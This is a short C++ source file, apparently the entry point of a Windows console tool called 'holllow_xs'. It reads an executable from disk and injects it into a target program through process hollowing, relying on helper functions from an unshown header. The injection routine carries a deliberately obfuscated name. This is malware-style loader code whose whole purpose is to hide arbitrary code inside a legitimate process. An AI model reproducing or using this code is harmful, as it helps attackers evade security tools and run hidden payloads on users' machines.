#pragma once
#pragma once
// holllow_xs.cpp : Defines the entry point for the console application.
//
#include "stdafx.h"


#include <stddef.h>
#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <tchar.h>
#include "ph.h"

const wchar_t *GetWC(const char *c)
{
	const size_t cSize = strlen(c) + 1;
	wchar_t* wc = new wchar_t[cSize];
	mbstowcs(wc, c, cSize);
	return wc;
}

static void *read_file(const char *path)
{
	FILE *fd;
	size_t size;
	void *map;
	int err = fopen_s(&fd, path, "rb");
	if (!fd)
		return NULL;
	fseek(fd, 0, SEEK_END);
	size = ftell(fd);
	if (!(map = malloc(size))) {
		fclose(fd);
		return NULL;
	}
	rewind(fd);
	fread(map, 1, size, fd);
	fclose(fd);
	return map;
}

enum ProcessInjectError
{
	PROCESS_INJECT_NOT_LOADED = -1,
	PROCESS_INJECT_SUCCESS = 0,
	PROCESS_INJECT_READ_ERROR = 1,
	PROCESS_INJECT_PROCESS_HOLLOWER_INITIALIZATION_FAILED = 2,
	PROCESS_INJECT_PROCESS_CREATE_ERROR = 3,
};

int x_inJx_procZss(char *input_x, char *target_x)
{
	void *map;
	TCHAR *path;


	if (!(map = read_file(input_x))) {
		return PROCESS_INJECT_READ_ERROR;
	}

	if (!ph_init()) {
		return PROCESS_INJECT_PROCESS_HOLLOWER_INITIALIZATION_FAILED;
	}

	path = (TCHAR*)GetWC(target_x);

	if (!create_hollowed_proc(path, NULL, map)) {
		return PROCESS_INJECT_PROCESS_CREATE_ERROR;
	}
	return PROCESS_INJECT_SUCCESS;
}

